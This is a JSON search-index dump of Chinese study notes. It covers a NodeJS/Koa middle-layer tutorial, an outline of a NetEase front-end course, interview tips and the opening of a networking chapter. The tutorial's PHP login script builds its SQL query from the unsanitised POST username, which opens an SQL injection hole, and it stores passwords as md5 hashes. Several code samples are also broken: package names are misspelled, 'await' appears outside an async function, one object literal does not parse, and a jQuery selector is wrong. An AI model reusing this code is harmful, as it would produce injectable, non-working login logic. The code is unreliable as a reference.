<p>3\u3001\u6027\u80fd\u95ee\u9898\uff1a\u4f20\u7edf\u7684\u5355\u9875\u5e94\u7528\u4e2d\u5168\u90e8\u9700\u8981\u5728\u521d\u59cb\u5316\u9636\u6bb5\u8bf7\u6c42JS\uff0c\u7f51\u7edc\u95ee\u9898\u53ef\u80fd\u9020\u6210\u5ef6\u8fdf\uff0c\u52a0\u5165\u4e2d\u95f4\u5c42\u540e\uff0c\u4e2d\u95f4\u5c42\u548c\u540e\u7aef\u5728\u540c\u4e00\u4e2a\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u8bf7\u6c42\u901f\u5ea6\u52a0\u5feb\uff0c\u907f\u514d\u4e86\u9996\u5c4f\u767d\u5c4f\u548c\u95ea\u52a8\u3002</p> <p>4\u3001\u5f00\u53d1\u6548\u7387\u95ee\u9898\uff1a\u4e2d\u95f4\u5c42\u53ef\u4ee5\u4f7f\u7528NodeJS\u6216\u8005PHP\u7b49\u5b9e\u73b0\u3002\u5982\u679c\u4f7f\u7528NodeJS\u5b9e\u73b0\u4e2d\u95f4\u5c42\uff0c\u90a3\u4e48\u548c\u524d\u7aef\u7684\u5f88\u591a\u65b9\u6cd5\u53ef\u4ee5\u5171\u7528\uff08\u907f\u514d\u8fdb\u884c\u4e24\u6b21\u8868\u5355\u9a8c\u8bc1\uff09\u3002NodeJS\u4f7f\u7528\u5355\u8fdb\u7a0b\u5355\u7ebf\u7a0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u5f02\u6b65\u6280\u672f\u6a21\u62df\u591a\u7ebf\u7a0b\u63d0\u9ad8\u5f00\u53d1\u6548\u7387\u95ee\u9898\u3002</p>"},{"location":"ebook-netease-senior-frontend/25-%E5%9F%BA%E4%BA%8ENodeJS%E6%89%93%E9%80%A0Web%E6%9E%B6%E6%9E%84%E4%B8%AD%E9%97%B4%E5%B1%82/#_5","title":"\u4e2d\u95f4\u5c42\u7684\u5b9e\u73b0","text":"<p>\u4f8b\u5b50\u4f7f\u7528 Koa \u6846\u67b6</p> <pre><code>yarn init -y\nyarn add -D koa koa-router koa-body-parserer koa-ejs\nnodemon app.js\n</code></pre> <p>\u6a21\u62df\u4e00\u4e2a\u767b\u9646\u754c\u9762\uff0c\u540e\u7aef\u4f7f\u7528PHP\u5b9e\u73b0</p> <pre><code>&lt;?php\n    require_once 'inc/conn.php';\n    $db = new DB();\n    $status = array();\n    if (empty($_POST['username'])) {\n    $status['code'] = 3;\n    echo json_encode($status);\n    exit;\n  }\n    $username = $_POST['username'];\n    $password = md5($_POST['password']);\n    $sql = \"SELECT user, password FROM admin WHERE user = '$username' AND password = '$password'\";\n    $db-&gt;query($sql);\n    $conn = $db-&gt;conn();\n    if ($conn-&gt;affected_rows &gt;= 1) {\n    $status['code'] = 1;\n  } else {\n    $status['code'] = 0;\n  }\n    echo json_encode($status);\n    $db-&gt;close();\n?&gt;\n</code></pre> <p>app.js \u4e2d\u95f4\u5c42</p> <pre><code>const Koa = require('koa');\nconst path = require('path');\nconst Router = require('koa-router');\nconst ejs = require('koa-ejs');\nconst body = require('koa-bodyparserer');\n// \u8def\u7531+\u6a21\u677f\u5f15\u64ce+\u89e3\u6790\u6570\u636e\n// \u5904\u7406\u9759\u6001\u8d44\u6e90\nconst static = require('koa-static');\n\nconst app = new Koa();\n\nejs(app, {\n  root: path.resolve(__dirname, 'template'),\n  layout: false,\n  viewExt: 'ejs',\n  cache: false,\n  debug: false\n});\n\nconst router = new Router();\napp.use(body());\n\nrouter.get(\"/\", ctx =&gt; {\n  ctx.body = 'main page';\n});\n\nrouter.use('/admin', require('./router/admin'));\napp.use(static('./static'));\napp.use(router.routes());\napp.listen(3000);\n</code></pre> <p>Admin.js</p> <pre><code>const Router = require('koa-router');\nconst router = new Router();\nrouter.get('/', async ctx =&gt; {\n  await ctx.render('admin/admin');\n});\n\nrouter.post('/login', ctx =&gt; {\n  const { username, password } = ctx.request.body;\n  // \u4e2d\u95f4\u4ef6\u4e2d\uff0c\u901a\u8fc7axios\u628a\u6570\u636e\u53d1\u7ed9\u540e\u7aef\u670d\u52a1\u5668\n  const { data } = await axios({\n    url: 'http://localhost/login/check.php',\n    method: 'post',\n    data: {\n      username,\n      password\n    },\n    // \u9700\u8981\u628aJSON\u8f6c\u6362\u6210\u67e5\u8be2\u5b57\u7b26\u4e32\uff08a=1&amp;b=2\uff09\n    transformRequest: [\n      data =&gt; {\n        return querystring.stringify(data)\n      }\n    ],\n  });\n\n  if (data.code !== 1) {\n    return ctx.body = {\n      code: 401,\n      message: 'not allowed'\n    }\n  }\n  ctx.body = {\n    code: 200,\n    message: 'check success'\n  };\n});\n\nmodule.exports = router.routes();\n</code></pre> <p>admin.ejs</p> <pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n  &lt;script src=\"./js/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;p&gt;\n    \u7528\u6237\u540d\uff1a&lt;input type=\"text\"/&gt;\n  &lt;/p&gt;\n  &lt;p&gt;\n    \u5bc6\u7801\uff1a&lt;input type=\"password\" name=\"password\"/&gt;\n  &lt;/p&gt;\n  &lt;button type=\"submit\"&gt;\u63d0\u4ea4&lt;/button&gt;\n  &lt;script&gt;\n    $(function() {\n      $('button').click(function() {\n        var username = $(':text').val();\n        var password = $('password').val();\n        $.ajax({\n          url: '/admin/login',\n          method: 'post',\n          data: {\n            username,\n            password\n          },\n          success(data) {\n            console.log(data);\n          }\n        });\n      });\n    });\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u73b0\u5728 server \u5c31\u76f8\u5f53\u4e8e\u4e2d\u95f4\u4ef6\uff0c\u57fa\u4e8eexpress\u6846\u67b6\uff0c\u628a\u8fd9\u90e8\u5206\u7684\u4ee3\u7801\u5199\u4e09\u6b21\u3002</p> <p>Query.js</p> <pre><code>const querystring = require('querystring');\nconst str = 'username=admin&amp;password=123456';\nconst obj = {\n  'username': 'admin',\n  'password': '123456';\n}\n\nconsole.log(quertstring.parse(str));\nconsole.log(querystring.stringify(obj));\n</code></pre>"},{"location":"ebook-netease-senior-frontend/readme/","title":"\u7f51\u6613\u9ad8\u7ea7\u524d\u7aef\u5f00\u53d1\u7cfb\u5217\u76f4\u64ad\u8bfe2","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 5053  \u9605\u8bfb11\u5206\u949f</p> <p>\u8bfe\u7a0b\u94fe\u63a5</p> <p>https://study.163.com/course/courseMain.htm?courseId=1209644871</p> <p>\u6bcf\u8282\u8bfe\u5927\u7ea62\u5c0f\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5316\u4e00\u4e0b\u57fa\u7840\uff08\u76ee\u524d\u662f13\u8bfe\u65f6\uff09</p> <p>\u8fd9\u90e8\u5206\u5185\u5bb9\u8f83\u96be\uff0c\u5b66\u4e60\u540e\u8981\u590d\u4e60\u5e76\u5199xmind\u7ed3\u6784\u56fe\uff1b\u80cc\u7b14\u8bb0\uff01\uff01\uff01\uff01\uff01</p>"},{"location":"ebook-netease-senior-frontend/readme/#_1","title":"\u5168\u90e8\u8bfe\u7a0b\u76ee\u5f55","text":"<p>\u7b2c1\u8bfe\uff1a\u4e00\u8282\u8bfe\u8ba9\u4f60\u9762\u8bd5\u65e0\u60e7vue\u54cd\u5e94\u5f0f\u539f\u7406  \u7b2c2\u8bfe\uff1a\u9762\u8bd5\u88c5\u903c\u5229\u5668\u2014v8\u5f15\u64ce\u5982\u4f55\u56de\u6536\u5185\u5b58  \u7b2c3\u8bfe\uff1a\u63ed\u79d8NodeJS\u4e0bRESTful\u67b6\u6784\u7684\u6700\u4f73\u5b9e\u8df5  \u7b2c4\u8bfe\uff1a\u7f16\u7a0b\u601d\u60f3\u7684\u63d0\u5347\u2014\u5982\u4f55\u63d0\u9ad8\u6211\u4eec\u4ee3\u7801\u7684\u53ef\u6269\u5c55\u6027  \u7b2c5\u8bfe\uff1a\u4f1a\u7528\u8fd8\u8981\u61c2\u5b83\u2014vue-router\u6e90\u7801\u89e3\u6790  \u7b2c6\u8bfe\uff1a\u70b9\u4eae\u5168\u6808\u6280\u80fd\uff0cSSR\u8f7b\u677e\u638c\u63e1  \u7b2c7\u8bfe\uff1a\u7f51\u6613\u771f\u5b9e\u9879\u76eewebpack\u914d\u7f6e\u89e3\u6790  \u7b2c8\u8bfe\uff1a2020\u5e74\u522b\u518d\u53ea\u5199\u4e1a\u52a1\u4ee3\u7801\uff0c\u4ece\u67b6\u6784\u5206\u6790api\u5c42  \u7b2c9\u8bfe\uff1a\u65b0\u5e74\u66f4\u9ad8\u76ee\u6807\u2014\u5e26\u4f60\u4e86\u89e3\u524d\u7aef\u8d1f\u8d23\u4eba\u7684\u5de5\u4f5c\u5185\u5bb9  \u7b2c10\u8bfe\uff1a\u5206\u6790\u6e90\u7801\u5b66\u67b6\u6784\uff0c\u90a3\u4e9b\u4f18\u79c0\u7684\u6846\u67b6\u90fd\u600e\u4e48\u5199\u7684  \u7b2c11\u8bfe\uff1a\u4ece\u4e24\u4e2a\u9700\u6c42\u51fa\u53d1\uff0c\u7ec3\u5c31\u9ad8\u8d28\u91cf\u4ee3\u7801  \u7b2c12\u8bfe\uff1a\u6253\u901a\u5168\u6808\uff0c\u8f7b\u677e\u5b9e\u73b0NodeJS+MongoDB\u7684\u767b\u5f55\u7cfb\u7edf  \u7b2c13\u8bfe\uff1avue\u65b0\u6280\u80fd\uff0cvue-cli3 \u4e0b\u5f00\u53d1UI\u5e93\u7684\u6700\u4f73\u5b9e\u8df5  \u7b2c14\u8bfe\uff1a\u4eca\u5e74\u5c06\u6b63\u5f0f\u53d1\u5e03vue3.0\uff0c\u6709\u54ea\u4e9b\u5347\u7ea7\u53d8\u5316  \u7b2c15\u8bfe\uff1a\u5982\u4f55\u5229\u7528TypeScript\u5f00\u53d1Vue\u5e94\u7528  \u7b2c16\u8bfe\uff1a\u5de5\u7a0b\u5316\u7684\u5f00\u59cb\uff0c\u5229\u7528node\u6784\u5efa\u81ea\u5df1\u7684\u811a\u624b\u67b6\u5de5\u5177  \u7b2c17\u8bfe\uff1a\u4ece\u6e90\u7801\u63a2\u7a76\u6784\u5efa\u5de5\u5177\u4e4b\u624b\u52a8\u5b9e\u73b0webpack  \u7b2c18\u8bfe\uff1aVue\u7f16\u8bd1\u5668\u6e90\u7801\u5206\u6790 -\u4eba\u4eba\u90fd\u80fd\u5199\u51fa\u7280\u5229\u7684\u5de5\u5177  \u7b2c19\u8bfe\uff1avue\u5168\u5bb6\u6876\u6e90\u7801\u63a2\u79d8,vue-router\u6e90\u7801\u5206\u6790  \u7b2c20\u8bfe\uff1a\u7ec4\u4ef6\u5f00\u53d1\u65b0\u59ff\u52bf\uff0c\u5b9e\u6218vue\u7ec4\u4ef6\u5316\u5f00\u53d1  \u7b2c21\u8bfe\uff1a\u7ed9\u4f60\u7684\u9762\u8bd5\u52a0\u52a0\u5206-ssr\u521d\u63a2  \u7b2c22\u8bfe\uff1avue\u53ef\u4ee5\u8fd9\u4e48\u73a9\uff0c\u5e26\u4f60\u67b6\u6784\u4e00\u4e2avue-cli  \u7b2c23\u8bfe\uff1aVue \u6e90\u7801\u4e2d\u90a3\u4e9b\u8ff7\u4eba\u7684\u8bbe\u8ba1\u601d\u60f3  \u7b2c24\u8bfe\uff1a2020\u5e74\u65b0\u7684\u5fc5\u5907\u6280\u80fd-\u5355\u5143\u6d4b\u8bd5\u5982\u4f55\u505a  \u7b2c25\u8bfe\uff1a\u9ad8\u85aa\u5fc5\u5907\uff0c\u57fa\u4e8eNodeJS\u6253\u9020Web\u67b6\u6784\u4e2d\u95f4\u5c42  \u7b2c26\u8bfe\uff1awebpack\u4e0d\u7b80\u5355-\u4e3a\u4f60\u63ed\u79d8webpack\u7684\u9ad8\u7ea7\u6280\u5de7  \u7b2c27\u8bfe\uff1a\u6280\u80fd\u5927\u7206\u70b8\uff0c\u4ece\u96f6\u5b9e\u73b0\u4e13\u4e1avue\u8f6e\u64ad\u7ec4\u4ef6</p>"},{"location":"ebook-netease-senior-frontend/readme/#xmind","title":"\u7b2c\u4e8c\u9636\u6bb5\uff1a\u6574\u7406xmind \u5e76\u80cc\u7b14\u8bb0","text":"<p>\u5df2\u7ecf\u6574\u7406 2\u30013\u30014\u30016\u30017\u30018\u30019\u300110\u300111\u300116\u300117\u300121\u300124\u300125\u300126</p> <p>\u672a\u6574\u7406 12\u3001</p>"},{"location":"ebook-netease-senior-frontend/readme/#_2","title":"\u9762\u8bd5\u95ee\u9898","text":"<p>\u57fa\u7840\u77e5\u8bc6\u95ee\u9898\uff1aJS\u57fa\u672c\u539f\u7406\uff08\u95ed\u5305\u3001\u9ad8\u9636\u51fd\u6570\u3001\u9632\u6296\u8282\u6d41\u3001\u6df1\u62f7\u8d1d\u6d45\u62f7\u8d1d\uff09\uff1bJS\u6700\u65b0\u7684API\uff1bJS\u5e95\u5c42\u539f\u7406\uff08\u5f02\u6b65\u3001GC\u3001\u53d8\u91cf\uff0c\u7f16\u7a0b\u8bbe\u8ba1\u539f\u7406\uff09</p> <p>\u5f02\u6b65\u7f16\u7a0b\uff1a\u540c\u6b65\u548c\u5f02\u6b65\uff08\u4ec0\u4e48\u5730\u65b9\u4f7f\u7528\u5230\u4e86\u5f02\u6b65\uff0c\u524d\u7aef\u7684\u8bf7\u6c42\u54cd\u5e94\uff0c\u540e\u7aef\u7684\u6570\u636e\u5e93\u6539\u53d8\uff0csetState\u754c\u9762\u6e32\u67d3\uff0c\u5b9a\u65f6\u5668\uff09\u3001eventLoop\u673a\u5236\uff08\u5728\u6d4f\u89c8\u5668\u548cNode\u4e2d\uff09\u3001\u5f02\u6b65\u7f16\u7a0b\u65b9\u6cd5\uff08\u53d1\u5e03\u8ba2\u9605\u6a21\u5f0f\uff0cPromise\uff0cgenerator\u51fd\u6570\u3001async-await\uff09\u3001\u5f02\u6b65\u67b6\u6784\uff08RxJS\uff09\u3001webworker\u591a\u7ebf\u7a0b\u673a\u5236</p> <p>\u6e90\u7801\u7c7b\u95ee\u9898\uff08VUE React Lodash jquery\uff09\u8fd9\u91cc\u53ef\u4ee5\u8bf4\u4e00\u4e0b\u6838\u5fc3\u6280\u672f\u548c\u8bbe\u8ba1\u6a21\u5f0f</p> <p>\u9879\u76ee\u95ee\u9898\uff08\u4f60\u505a\u4e86\u4ec0\u4e48\u4e8b\u60c5\uff09\uff1a\u9996\u5148\u7b80\u4ecb\u9879\u76ee\u4e2d\u7684\u6280\u672f\u6808\u548c\u6838\u5fc3\u6280\u672f\uff1b\u7a81\u51fa\u9879\u76ee\u4e2d\u7684APP\u7aef\u9002\u914d\uff0c\u7ec4\u4ef6\u5e93\uff0c\u67b6\u6784\u8bbe\u8ba1\uff1b\u9879\u76ee\u4f18\u5316\u8bbe\u8ba1\uff08\u7ba1\u7406\u7ec4\u4ef6\u7684keep-alive\uff09\u5206\u6a21\u5757\u7ba1\u7406\u4e1a\u52a1\u3002</p>"},{"location":"ebook-netease-senior-frontend/readme/#_3","title":"\u672a\u6765\u5c55\u671b","text":"<p>TS\u662f\u524d\u7aef\u7684\u4e3b\u6d41\uff08\u672a\u6765\u7684\u8d8b\u52bf\uff09VUE3\u6e90\u7801\u662fTS\u6587\u4ef6\uff0c\u963f\u91cc\u7684\u6846\u67b6\u6e90\u7801antd-mobile\u4e5f\u662f\u7528\u7684TS\u6587\u4ef6</p> <p>\u9700\u8981\u4f1a\u591a\u4e2a\u6846\u67b6\uff08\u4ec0\u4e48\u60c5\u51b5\u4e0b\u4f7f\u7528\u4ec0\u4e48\u6846\u67b6\uff09</p> <p>\u53ef\u4ee5\u628a\u73b0\u5728\u7684\u9879\u76ee\uff0c\u81ea\u5df1\u5148\u5199\u51fa\u67b6\u6784\uff0c\u501f\u9274\u597d\u7684\u9879\u76ee\u7684\u67b6\u6784 </p> <p>\u4e2d\u7ea7\u5de5\u7a0b\u5e08\u53ef\u4ee5\u5199\u51fa\u4ee3\u7801\uff0c\u5e76\u4f5c\u51fa\u4e00\u90e8\u5206\u4f18\u5316\uff1b\u4e2d\u7ea7\u524d\u7aef\u96be\u4e0a\u5347\u7684\u539f\u56e0\uff1a\u4e0d\u6e05\u695a\u81ea\u5df1\u7684\u4ee3\u7801\u54ea\u91cc\u53ef\u4ee5\u7ee7\u7eed\u63d0\u9ad8\uff1f</p> <p>\u9ad8\u7ea7\u5de5\u7a0b\u662f\u9700\u8981\u8f6f\u4ef6\u5de5\u7a0b\u7684\u7406\u8bba\uff0c\u9700\u8981\u4e86\u89e3\u5e95\u5c42\u77e5\u8bc6\u3002</p> <p>\u81ea\u5df1\u7684\u4ee3\u7801\uff0c\u9996\u5148\u81ea\u5df1review\uff0c\u7136\u540e\u8ba9\u66f4\u597d\u7684\u4ebareview\uff0c\u770b\u770b\u95ee\u9898\u5728\u54ea\u91cc\u3002\u540c\u65f6\u770b\u770b\u4f18\u79c0\u9879\u76ee\u4e2d\u7684\u4ee3\u7801\u600e\u4e48\u5199\u3002\u8bbe\u8ba1\u6a21\u5f0f\uff0cJS \u7cbe\u901a\u539f\u7406\u3002\u4ece\u4f18\u79c0\u7684\u4ee3\u7801\u4e2d\u6284\u5199\uff0c\u7136\u540e\u6162\u6162\u5c31\u6709\u81ea\u5df1\u7684\u611f\u53d7\u4e86\u3002</p>"},{"location":"ebook-netease-senior-frontend/readme/#_4","title":"\u6700\u540e","text":"<p>\u81ea\u5df1\u9700\u8981\u505a\u7684\u4e8b\u60c5\uff1a\u73b0\u5728\u8bf4\u660e\uff0c\u4e0d\u65ad\u4e4b\u524d\u7684\u89c6\u9891\u6559\u7a0b\uff0c\u8fd8\u662f\u5f88\u7ba1\u7528\u7684\uff0c\u52a0\u5f3a\u57fa\u7840\u90e8\u5206\u3002</p> <p>\u522b\u4eba\u4e0d\u80fd\u89e3\u51b3\u7684\u95ee\u9898\uff0c\u81ea\u5df1\u53ef\u4ee5\u89e3\u51b3\uff08\u770b\u61c2\u6e90\u7801\u5e76\u89e3\u51b3\u95ee\u9898\uff09</p> <p>React \u6df1\u5165\u5b66\u4e60</p> <p>\u8054\u60f3\u7535\u8111\u4e0a\u9762\u7684\u89c6\u9891\u8d44\u6599\uff08\u6216\u8005\u65b0\u4e0b\u8f7d\u7684\u65b0\u7684\u89c6\u9891\u8d44\u6599\uff09</p> <p>\u81ea\u5df1\u8981\u603b\u7ed3\u4e0d\u540c\u9879\u76ee\u7684\u7279\u70b9\u548c\u4f18\u5316\u65b9\u6848\uff08\u754c\u9762\u600e\u6837\u5b9e\u73b0\uff0c\u4e1a\u52a1\u903b\u8f91\u600e\u6837\u5b9e\u73b0\uff0c\u81ea\u5df1\u591a\u60f3\u60f3\uff0c\u4ee3\u7801\u67b6\u6784\u600e\u6837\u5b9e\u73b0\uff09</p> <p>\u7f51\u6613\u662f\u6d59\u5927\uff1a\u6280\u672f\u8fc7\u4e86\uff0c\u5b66\u5386\u548c\u5de5\u4f5c\u7ecf\u5386\u90fd\u8981\u80cc\u8c03\u3002</p> <p>2019\u5e74\u81ea\u5df1\u4e00\u76f4\u5728\u780c\u5899\uff0c2020\u5e74\u81ea\u5df1\u8981\u780c\u66f4\u597d\u7684\u5899\uff0c\u540c\u65f6\u5b66\u4e60\u5982\u4f55\u76d6\u623f\u5b50\u3002</p> <p>\u6e90\u7801\u90e8\u5206\uff0c\u8001\u5e08\u53ef\u4ee5\u544a\u8bc9\u770b\u6e90\u7801\u7684\u5feb\u6377\u65b9\u6cd5\u548c\u57fa\u672c\u5206\u7c7b\uff0c\u5269\u4e0b\u7684\u8fd8\u9700\u8981\u81ea\u5df1\u4e0b\u53bb\u6572\u4ee3\u7801\uff0c\u770b\u6e90\u7801\u3002</p> <p>20k\u7684\u76ee\u6807\uff1a\u5b8c\u6210\u6838\u5fc3\u6a21\u5757\u5b9e\u73b0\uff1a\u7ec4\u4ef6\u5e93\u5de5\u5177\u5e93\u652f\u6301\u5e93\u7684\u5b9e\u73b0\uff1b\u5177\u4f53\u7684\u4e1a\u52a1\u4ee3\u7801\u5c31\u662f\u4f4e\u7aef\u7684\u90e8\u5206\uff1b\u8bbe\u8ba1\u67b6\u6784\u66f4\u91cd\u8981\uff08\u9ad8\u7ea7\u524d\u7aef\uff09\uff1b\u826f\u597d\u7684\u4ee3\u7801\u8d28\u91cf\uff1b\uff08\u67e5\u770b25K\u7684\u524d\u7aef\u7684\u62db\u8058\u8981\u6c42\uff09\u7f16\u7a0b\u601d\u7ef4+\u7b97\u6cd5+\u5e95\u5c42\u77e5\u8bc6</p> <p>\u5b66\u4e60\u6ce8\u610f\u6548\u7387\uff1a\u73b0\u5728\u65f6\u95f4\u4e0d\u591a\uff0c\u6240\u4ee5\u9700\u8981\u63d0\u9ad8\u6548\u7387\uff0c\u770b\u4e00\u5806\u5c71\u5be8\u7684\u6587\u6863\u6548\u679c\u6ca1\u6709\u90a3\u4e48\u597d\u3002</p> <p>\u9762\u8bd5\uff1a</p> <p>1\u3001\u5c16\u7aef\u6280\u672f\uff08SSR\uff09</p> <p>2\u3001\u4f18\u5316\u65f6\u95f4\uff0c\u91cd\u6784webpack\u6253\u5305\uff0cdll \u4f18\u5316\uff0cwebpack \u5e76\u53d1\u6e32\u67d3</p> <p>3\u3001\u81ea\u5df1\u5728\u9879\u76ee\u4e2d\u7684\u57fa\u7840\u652f\u6301\uff1a\u4e3a\u516c\u53f8\u5b9a\u5236\u7ec4\u4ef6\u5e93\u548c\u5de5\u5177\u5e93</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/","title":"01 \u6982\u8ff0","text":""},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_1","title":"\u7b2c\u4e00\u7ae0 \u6982\u8ff0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 16885  \u9605\u8bfb34\u5206\u949f</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#11","title":"1.1 \u8ba1\u7b97\u673a\u7f51\u7edc\u5728\u4fe1\u606f\u65f6\u4ee3\u7684\u4f5c\u7528","text":"<p>\u8ba1\u7b97\u673a\u7f51\u7edc\u662f\u91cd\u8981\u7684\u4fe1\u606f\u670d\u52a1\u57fa\u7840\u8bbe\u7f6e\uff0c\u4f7f\u7528\u4e92\u8054\u7f51\u7684\u4eba\u6570\u548c\u65f6\u95f4\u589e\u52a0\uff1b\u79fb\u52a8\u7aef\u8986\u76d6\u7387\u8d8a\u6765\u8d8a\u9ad8\u3002</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#12","title":"1.2 \u56e0\u7279\u7f51\u6982\u8ff0","text":""},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_2","title":"\u7f51\u7edc\u4e09\u4e2a\u540d\u8bcd\u7684\u533a\u522b","text":"<ul> <li> <p>\u7f51\u7edc\uff1a\u7531\u82e5\u5e72\u8282\u70b9\u548c\u8fde\u63a5\u8fd9\u4e9b\u8282\u70b9\u7684\u94fe\u8def\u7ec4\u6210(Node + Link)</p> </li> <li> <p>\u4e92\u8054\u7f51\uff08internet \u5c0f\u5199\uff09\uff1a\u591a\u4e2a\u7f51\u7edc\u901a\u8fc7\u8def\u7531\u5668\u8fde\u63a5\u8d77\u6765\uff0c\u6784\u6210\u4e92\u8054\u7f51</p> </li> <li> <p>\u56e0\u7279\u7f51\uff08Internet \u5927\u5199\uff0c\u4e13\u6709\u540d\u8bcd\uff09\uff1a\u4e16\u754c\u4e0a\u6700\u5927\u7684\u4e92\u8054\u7f51\uff0cTCP/IP \u89c4\u5219</p> </li> </ul>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#_3","title":"\u56e0\u7279\u7f51\u7684\u7ec4\u6210","text":"<p>\u4e92\u8054\u7f51\u7531\u8fb9\u7f18\u90e8\u5206+\u6838\u5fc3\u90e8\u5206\u7ec4\u6210</p> <ul> <li> <p>\u8fb9\u7f18\u90e8\u5206\uff1a\u6240\u6709\u8fde\u63a5\u5728\u56e0\u7279\u7f51\u4e0a\u7684\u4e3b\u673a\u7ec4\u6210\uff0c\u7528\u6237\u76f4\u63a5\u4f7f\u7528\uff08\u8fdb\u884c\u901a\u4fe1\u548c\u8d44\u6e90\u5171\u4eab\uff0c\u5305\u62ec\u670d\u52a1\u5668\uff0cPC\uff0c\u667a\u80fd\u8bbe\u5907\uff09</p> </li> <li> <p>\u6838\u5fc3\u90e8\u5206\uff1a\u5927\u91cf\u7f51\u7edc\u548c\u94fe\u63a5\u8fd9\u4e9b\u7f51\u7edc\u7684\u8def\u7531\u5668\u7ec4\u6210\uff0c\u4e3a\u8fb9\u7f18\u90e8\u5206\u63d0\u4f9b\u670d\u52a1\uff08\u8054\u901a\u6027+\u4fe1\u606f\u4ea4\u4e92\uff09</p> </li> </ul> <p>\u56e0\u7279\u7f51\u7684\u4e09\u4e2a\u9636\u6bb5\uff08\u4e86\u89e3\uff09\uff1a\u963f\u5e15\u7f51-\u4e09\u7ea7\u7ed3\u6784\u56e0\u7279\u7f51-\u591a\u5c42ISP\u7ed3\u6784\u7684\u56e0\u7279\u7f51\u3002ISP\uff1aInternet server provider \u56e0\u7279\u7f51\u670d\u52a1\u63d0\u4f9b\u8005\uff08\u56fd\u5185\u4e2d\u56fd\u7535\u4fe1\uff0c\u56fd\u9645ISP\uff0c\u56fd\u5bb6ISP\uff0c\u4f01\u4e1aISP\uff09</p> <p>\u56e0\u7279\u7f51\u7684\u6807\u51c6\u5316\uff08\u4e86\u89e3\uff09\uff1aISOC\u7ec4\u7ec7\uff0c\u7c7b\u4f3c\u4e8e ECMA \u7ec4\u7ec7\uff0c\u5236\u5b9a\u5404\u79cd\u6807\u51c6\u548c\u8349\u6848</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#13","title":"1.3 \u4e09\u79cd\u4ea4\u6362\u65b9\u5f0f\uff1a\u7535\u8def\u4ea4\u6362\u3001\u5206\u7ec4\u4ea4\u6362\u548c\u62a5\u6587\u4ea4\u6362","text":"<p>\u4f7f\u7528\u573a\u666f\uff1a\u7535\u8def\u4ea4\u6362\u662f\u56fa\u5b9a\u7535\u8bdd\uff0c\u62a5\u6587\u4ea4\u6362\u662f\u7535\u62a5\uff0c\u5206\u7ec4\u4ea4\u6362\u662f\u4e92\u8054\u7f51\uff0c\u4e0b\u9762\u8be6\u8ff0</p> <p>\u4ea4\u6362\uff1a\u6309\u7167\u67d0\u79cd\u65b9\u5f0f\uff0c\u52a8\u6001\u5206\u914d\u4f20\u8f93\u7ebf\u8def\u7684\u8d44\u6e90</p>"},{"location":"ebook-network-basic/01%20%E6%A6%82%E8%BF%B0/#circuit-switching","title":"\u7535\u8def\u4ea4\u6362\uff08Circuit Switching\uff09","text":"<p>\u4f20\u7edf\u6709\u7ebf\u7535\u8bdd\uff0c\u901a\u8fc7\u76f4\u63a5\u8fde\u63a5\uff0c\u6216\u8005\u7535\u8bdd\u4ea4\u6362\u673a\u8fdb\u884c\u7535\u8def\u4ea4\u6362\u3002</p> <p>\u6b65\u9aa4</p> <ol> <li>\u5efa\u7acb\u8fde\u63a5\uff08\u5206\u914d\u901a\u4fe1\u8d44\u6e90\uff09</li> <li>\u901a\u8bdd\uff08\u62a5\u6587\u4f20\u8f93\uff0c\u4e00\u76f4\u5360\u7528\u901a\u4fe1\u8d44\u6e90\uff0c\u4e0d\u7ba1\u6709\u6ca1\u6709\u5b9e\u9645\u7684\u8bed\u97f3\uff09</li> <li>\u91ca\u653e\u8fde\u63a5\uff08\u5f52\u8fd8\u901a\u4fe1\u8d44\u6e90\uff09</li> </ol> <p>\u4e3a\u4ec0\u4e48\u8ba1\u7b97\u673a\u7f51\u7edc\u4e0d\u9002\u7528\u7535\u8def\u4ea4\u6362\uff1a\u8ba1\u7b97\u673a\u6570\u636e\u662f\u7a81\u53d1\u5f0f\u7684\u4f20\u8f93\u5728\u7ebf\u8def\u4e0a\uff0c\u53ef\u80fd\u77ed\u65f6\u95f4\u4e0b\u8f7d\u5927\u91cf\u6570\u636e\uff0c\u4e5f\u53ef\u80fd\u957f\u65f6\u95f4\u4e0d\u4e0b\u8f7d\u6570\u636e\uff0c\u6240\u4ee5\u4f7f\u7528\u7535\u8def\u4ea4\u6362\u4f20\u8f93\u8ba1\u7b97\u673a\u6570\u636e\uff0c\u4f20\u8f93\u6548\u7387\u8f83\u4f4e\u3002\u6240\u4ee5\u8ba1\u7b97\u673a\u7f51\u7edc\u4f7f\u7528\u5206\u7ec4\u4ea4\u6362</p> <p>\u4f18\u70b9\uff1a\u901a\u4fe1\u65f6\u5ef6\u5c0f\uff1b\u6709\u5e8f\u4f20\u8f93\uff0c\u6ca1\u6709\u51b2\u7a81\uff0c\u9002\u7528\u8303\u56f4\u5e7f\uff0c\u5b9e\u65f6\u6027\u5f3a\uff0c\u63a7\u5236\u7b80\u5355\uff1b\u6bd4\u7279\u6d41\u76f4\u8fbe\u91cd\u70b9\uff0c\u4e0d\u9700\u8981\u4e2d\u95f4\u5b58\u50a8\u8f6c\u6362</p> 